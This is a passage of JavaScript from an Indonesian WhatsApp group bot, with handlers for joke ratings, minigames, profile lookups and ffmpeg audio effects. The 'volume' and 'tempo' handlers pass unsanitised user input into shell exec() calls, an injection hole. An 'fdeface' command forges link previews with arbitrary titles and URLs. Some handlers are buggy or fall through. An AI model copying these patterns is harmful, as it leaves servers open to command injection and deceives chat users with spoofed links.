hob =["Desah Di Game","Ngocokin Doi","Stalking sosmed nya mantan","Kau kan gak punya hobby awokawok","Memasak","Membantu Atok","Mabar","Nobar","Sosmedtan","Membantu Orang lain","Nonton Anime","Nonton Drakor","Naik Motor","Nyanyi","Menari","Bertumbuk","Menggambar","Foto fotoan Ga jelas","Maen Game","Berbicara Sendiri","Nonton Wibu","Memasak","Membantu Atok","Mabar","Nobar","Sosmed an","Membantu Orang lain","Nonton Anime","Nonton Drakor","Naik Motor","Nyanyi","Menari","Bertumbuk","Menggambar","Foto fotoan Ga jelas","Maen Game","Berbicara Sendiri"]
const by = hob[Math.floor(Math.random() * hob.length)]
client.sendMessage(from, 'Jawaban : '+ by, text, { quoted: mek })
 await confirmLIMIT(sender, [angka])
break 
case 'gaycek':
case 'rate':
case 'sangecek':
case 'lesbicek':
case 'gantengcek':
case 'jelekcek':
case 'goblokcek':
case 'nolepcek':
case 'wibucek':
case 'jomblocek':
case 'pakboycek':
case 'pakgirlcek':
case 'halalcek':
case 'haramcek':
case 'cantikcek':
case 'bucincek':
case 'bebancek':
case 'pintarcek':
case 'begocek': 
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from)
if (!isGroup) return replysticker(grupstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.sendMessage(from, `Jawaban : ${date1}%`, text, { quoted: mek })
await confirmLIMIT(sender, [angka])
break
case 'bisakah':
case 'bagaimanakah':
case 'apakah':
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from)
if (!isGroup) return replysticker(grupstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} pertanyaan`)
const bisa = ["Ya","Tidak","Ga tau","ga mungkin","bisa jadi","mungkin"]
const keh = bisa[Math.floor(Math.random() * bisa.length)]
client.sendMessage(from, 'Jawaban : '+ keh, text, { quoted: mek })
await confirmLIMIT(sender, [angka])
break
case 'kapankah':
case 'kapan':
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from)
if (!isGroup) return replysticker(grupstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} pertanyaan`)
client.sendMessage(from, `Jawaban : ${date1} ${lucBulan1} lagi `, text, { quoted: mek })
await confirmLIMIT(sender, [angka])
break

//MINIGAME LUCMENU
case 'delvote':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isEvento) return reply(ind.evento())
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
            if(isVote) return reply('Tidak ada sesi Voting')
            delVote(from)
            reply('Sukses Menghapus sesi Voting Di Grup Ini')
			await confirmLIMIT(sender, [angka])
            break
case 'voting':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isEvento) return reply(ind.evento())
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
            if (isVote) return reply('Sesi Voting Sedang Berlangsung Di Grup Ini')
            if(!q) return reply('*Voting*\n\n'+ prefix+ 'voting @tag target | reason  | 1 (1 = 1 Menit)')
            if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || mek.message.extendedTextMessage.contextInfo == null) {
            let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return reply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
			await confirmLIMIT(sender, [angka])
            break
case 'suit':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isEvento) return reply(ind.evento())
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply('Pilih Batu,Gunting atauKertas')
const botol = ['Batu','Gunting','Kertas']
const suitcuy = botol[Math.floor(Math.random() * botol.length)]
brow = `
*BOT*
> ${suitcuy}
*KAMU*
> ${q}
`
reply(brow)
await confirmLIMIT(sender, [angka])
break
case 'caklontong':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isEvento) return reply(ind.evento())
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
data = fs.readFileSync('./src/minigameluc/caklontong.js');
cak = JSON.parse(data);
lontong = Math.floor(Math.random() * cak.length);
randKey = cak[lontong];
Pertanyaan = randKey.result.soal
Jawaban = '\n*'+randKey.result.desc +'*'
setTimeout( () => {
client.sendMessage(from, Jawaban, text, {quoted: mek})
}, 30000)
setTimeout( () => {
client.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
}, 20000) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
}, 10000) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
}, 2500) // 1000 = 1s
client.sendMessage(from, Pertanyaan, text, {quoted: mek})
await confirmLIMIT(sender, [angka])
break
case 'tebakgambar':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isEvento) return reply(ind.evento())
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
data = fs.readFileSync('./src/minigameluc/group/tebakgambar.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
randSoal =await getBuffer(randKey.result.soalImg)
setTimeout( () => {
client.sendMessage(from, '*➸ Jawaban :* '+ randKey.result.jawaban +'\n', text, {quoted: mek}) // ur cods
}, 30000) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
}, 20000) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
}, 10000) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
}, 2500) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, randSoal, image, { caption: '_Jelaskan Apa Maksud Gambar Ini_', quoted: mek, thumbnail: Buffer.alloc(0) }) // ur cods
}, 0) // 1000 = 1s,
await confirmLIMIT(sender, [angka])
break
case 'family100':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isEvento) return reply(ind.evento())
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
data = fs.readFileSync('./src/minigameluc/family100.js');
fami = JSON.parse(data);
ly100 = Math.floor(Math.random() * fami.length);
randKey = fami[ly100];
Pertanyaan = randKey.result.soal
setTimeout( () => {
client.sendMessage(from, '*➸ Jawaban :* \n```'+randKey.result.jawaban +'```', text, {quoted: mek}) // ur cods
}, 30000) // 1000 = 1s,
setTimeout( () => {
reply('_Waktu Anda Habis_')
}, 29000)
setTimeout( () => {
client.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
}, 20000) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
}, 10000) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
}, 2500) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, '*'+ Pertanyaan +'*', text, {quoted: mek }) // ur cods
}, 0) // 1000 = 1s,
await confirmLIMIT(sender, [angka])
case 'delsesi':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return reply('Hanya bisa didelete oleh admin group dan owner bot')
if (!isEvento) return reply(ind.evento())
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args[0] === 'ttt') {
delete tictactoe[senderNumber]
fs.writeFileSync("./database/bot/tictactoe.json", JSON.stringify(tictactoe))                        
if (fs.existsSync('./temp/' + from + '.json')) {
fs.unlinkSync('./temp/' + from + '.json')
reply('Berhasil Menghapus Sesi Ttt')
} else {
reply('Tidak ada sesi yang berlangsung')
}
} else {
reply('Pilih')
}
await confirmLIMIT(sender, [angka])
break
case 'tictactoe':
case 'ttt':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isEvento) return reply(ind.evento())
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
if (fs.existsSync(`./temp/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delsesi ttt*, untuk menghapus sesi`)
if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
tttSkuy = setTtt(`${from}`)
tttSkuy.status = false
tttSkuy.Z = sender.replace("@s.whatsapp.net", "")
tttSkuy.Y = args[0].replace("@", "");
fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
starGame = `「 *Memulai Game Tictactoe* 」\n\n•@${sender.replace("@s.whatsapp.net", "")} Menantang Bermain Tictactoe \n[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan\n\n_Game tictactoe on_`
client.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
 await confirmLIMIT(sender, [angka])
break
case 'cekhistory':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isEvento) return reply(ind.evento())
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.sendMessage(from, starGame, text, `\`\`\`「 Status Tictactoe 」\`\`\`\n•> Win : ${checkWin(sender)}\n•> Lose : ${checkLose(sender)}`, {quoted: mek})
await confirmLIMIT(sender, [angka])
break			
case 'leaderboard':
				case 'lb':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isEvento) return reply(ind.evento())
				_registered.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
				_registered.sort((a, b) => (a.uang < b.uang) ? 1 : -1)
                let leaderboardlvl = '-----[ *LEADERBOARD LEVEL* ]----\n\n'
                let leaderboarduang = '-----[ *LEADERBOARD UANG* ]----\n\n'
                let nom = 0
                try {
                    for (let i = 0; i < 15; i++) {
                        nom++
                        leaderboardlvl += `*[${nom}]* wa.me/${_registered[i].id.replace('@s.whatsapp.net', '')}\n┗⊱ *XP*: ${_registered[i].xp} *Level*: ${_level[i].level}\n`
                        leaderboarduang += `*[${nom}]* wa.me/${_registered[i].id.replace('@s.whatsapp.net', '')}\n┣⊱ *Uang*: _Rp${_registered[i].uang}_\n`
                    }
                    await reply(leaderboardlvl)
                    await reply(leaderboarduang)
                } catch (err) {
                    console.error(err)
                    await reply(`minimal 10 user untuk bisa mengakses database`)
                }
				break

case 'getname':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
var ambl = mek.message.extendedTextMessage.contextInfo.participant
const sname = client.contacts[ambl] != undefined ? client.contacts[ambl].sname || client.contacts[ambl].notify : undefined
reply(sname)
break
case 'getname2':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
reply(pes)
break
case 'getname3':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
reply(chatsa)
break
case 'getname1':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ambl = mek.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage.caption
reply(ambl) 
} else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
ambl = mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.caption 
reply(ambl) 
} else if ((!mek.message.quotedMessage) && args.length == 0) {
ambl = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation 
reply(ambl) 
} else {
reply("lu beban") }
break
case 'getbio':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!q) return reply('tag orangnya')
var yy = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
var p = await client.getStatus(`${q}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply("Status Profile Not Found", {quoted : mek})
}
break
case 'getpic':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!q) return reply('tag orangnya')
client.updatePresence(from, Presence.composing)
var picuut = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
try {
ppimg = await client.getProfilePicture(`${picuut}`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
buffer = await getBuffer(ppimg)
client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: Buffer.alloc(0)})
break
case 'tag':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
noes = `${args[0]}@s.whatsapp.net`
beks = `@${noes.split("@")[0]}`
client.sendMessage(from, beks, text, {quoted:mek, contextInfo:{mentionedJid:[noes]}})                
break
//LUC MENU
//CONVERT AUIO//
case 'zalgo':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`kirim pesan dengan caption ${prefix+command} teksnya`)
reply(zalgo(`${q}`))
await confirmLIMIT(sender, [angka])
case 'vapor':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`kirim pesan dengan caption ${prefix+command} teksnya`)
reply(vapor(`${q}`))
await confirmLIMIT(sender, [angka])
break
case 'tourl':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
owgi = await client.downloadMediaMessage(boij)
res = await upload(owgi)
reply(res)
} else {
reply(`kirim pesan dengan caption ${prefix+command} teksnya`)
}
await confirmLIMIT(sender, [angka])
break 
case 'detikvn':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())				
if (!isQuotedAudio) return reply('Reply audionya')
if (!q) return reply(`kirim pesan dengan caption ${prefix+command} sesuaikan durasinya`)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await client.downloadAndSaveMediaMessage(encmedia)
cokmatane = Number(args[0])
hah = fs.readFileSync(media)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
fs.unlinkSync(media)
await confirmLIMIT(sender, [angka])
break
case 'detikvideo':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isPremium && !isOwner) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedVideo) return reply('Reply videonya')
if (!q) return reply(`kirim pesan dengan caption ${prefix+command} sesuaikan durasinya`)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await client.downloadAndSaveMediaMessage(encmedia)
cokmatane = Number(args[0])
hah = fs.readFileSync(media)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
fs.unlinkSync(media)
await confirmLIMIT(sender, [angka])
break
case 'volume':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio) return reply('Reply audio!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await client.downloadAndSaveMediaMessage(encmedia)
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
client.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek})
fs.unlinkSync(rname)
})
await confirmLIMIT(sender, [angka])
break           
case 'say':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isPremium && !isOwner) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
teks = body.slice(5)
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply(`Contoh : ${prefix}${command} ${pushname}`)
if (args.length < 1) return reply('teksnya mana kak?')
saying = teks
client.sendMessage(from, saying, text)
await confirmLIMIT(sender, [angka])
break
case 'fdeface':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
ge = args.join('')           
var pe = ge.split("|")[0];
var pen = ge.split("|")[1];
var pn = ge.split("|")[2];
var be = ge.split("|")[3];
const fde = `kirim/reply image dengan capion ${prefix}${command} link|title|desc|teks`
if (args.length < 1) return reply (fde)
const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const tipes = await client.downloadAndSaveMediaMessage(dipes)        
const bufer = fs.readFileSync(tipes)
const desc = `${pn}`
const title = `${pen}`
const url = `${pe}`
const buu = `https://${be}`
var anu = {
detectLinks: false
}
var mat = await client.generateLinkPreview(url)
mat.title = title;
mat.description = desc;
mat.jpegThumbnail = bufer;
mat.canonicalUrl = buu; 
client.sendMessage(from, mat, MessageType.extendedText, anu)
await confirmLIMIT(sender, [angka])
break     
case 'tts':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return client.sendMessage(from, `Kode bahasanya mana gan?\n Kalo Gatau Kode Bahasanya Apa Aja Ketik Saja ${prefix}bahasa`, text, {quoted: mek})
const gtts = require('./lib/bot/gtts')(args[0])
if (args.length < 2) return client.sendMessage(from, 'Textnya mana ngab', text, {quoted: mek})
dtt = body.slice(8)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
dtt.length > 600
? reply('Textnya kebanyakan setan!!')
: gtts.save(ranm, dtt, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buffer = fs.readFileSync(rano)
if (err) return reply('Gagal om:(')
client.sendMessage(from, buffer, audio, {quoted: mek, ptt:true})
fs.unlinkSync(rano)
})
})
await confirmLIMIT(sender, [angka])
break
case 'ghost':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break 
case 'vibra': 
var req = args.join(' ')
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia) 
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter_complex "vibrato=f=10" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'gemes':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=50000" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
riu = fs.readFileSync(ran)
client.sendMessage(from, riu, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'tempo':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
var req = args.join(" ")
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'nightcore':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'fast':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.63,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
uhh = fs.readFileSync(ran)
client.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'trigg':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter_complex "acrusher=level_in=8:level_out=18:bits=8:mode=log:aa=1" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek })
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'slow':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'bass': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend()) 
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'robot':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend()) 
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(mess.error.api)
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'gemuk':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'tupai':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'reverse':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
